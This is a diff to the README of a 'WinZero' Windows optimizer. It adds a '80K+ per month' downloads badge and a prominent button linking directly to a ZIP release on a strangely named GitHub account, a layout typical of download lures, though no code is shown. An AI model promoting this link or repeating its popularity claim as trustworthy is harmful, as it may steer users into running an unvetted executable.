@@ -10,6 +10,25 @@
 
 ---
 
+<p align="center">
+  <img src="https://img.shields.io/badge/Downloads-80K+%20per%20month-32CD32?style=for-the-badge&logo=windows&logoColor=white">
+</p>
+
+<p align="center">
+  <a href="https://github.com/monopldisappointed-commits/WinZero/releases/download/v1.2/WinZero.zip">
+    <img src="https://img.shields.io/badge/⬇%20DOWNLOAD%20WINZERO-FREE%20LATEST%20VERSION-00C853?style=for-the-badge&logo=github&logoColor=white">
+  </a>
+</p>
+
+<p align="center">
+  <b>Modern Windows Optimizer • Privacy Tool • FPS Boost Utility</b>
+</p>
+```
+
+
+---
+
+
 ## 🚀 About WinZero
 
 WinZero is a modern open-source Windows optimizer built for users who want a faster, cleaner and more private Windows experience.
